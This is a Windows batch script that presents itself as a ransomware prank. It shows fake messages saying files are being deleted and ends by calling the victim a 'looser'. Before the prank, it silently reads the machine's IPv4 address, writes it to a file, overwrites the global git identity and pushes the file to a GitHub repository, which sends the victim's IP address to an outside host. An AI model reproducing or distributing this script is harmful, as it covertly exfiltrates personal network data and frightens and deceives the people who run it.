@echo off
color a
mode 1000
setlocal EnableDelayedExpansion

:: Capture IP address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| find "IPv4 Address"') do (
    set "ip=%%a"
    set "ip=!ip:~1!"
)

:: Navigate to the directory of the batch file
cd "%~dp0"

:: Check if captured-ip directory exists, if not, create it
if not exist captured-ip (
    mkdir captured-ip
)

:: Output IP address to captured-ip.txt
echo !ip! > captured-ip/captured_ip.txt

:: Configure Git (replace with your GitHub username and email)
git config --global user.email "your-email@example.com"
git config --global user.name "Your Name"

:: Add, commit, and push changes to GitHub
git add captured-ip/captured_ip.txt
git commit -m "Update captured IP address"
git push origin main

:: Pause to keep the command prompt window open for a moment
pause

ping 1.1.1.1 -n 5 -w 1000>NUL
echo Ransomware is being deleted now....
pause
msg *Ransomware is commencing...
dir /s
cls
echo Your files are almost all gone now...
pause
msg * Pranked looser...
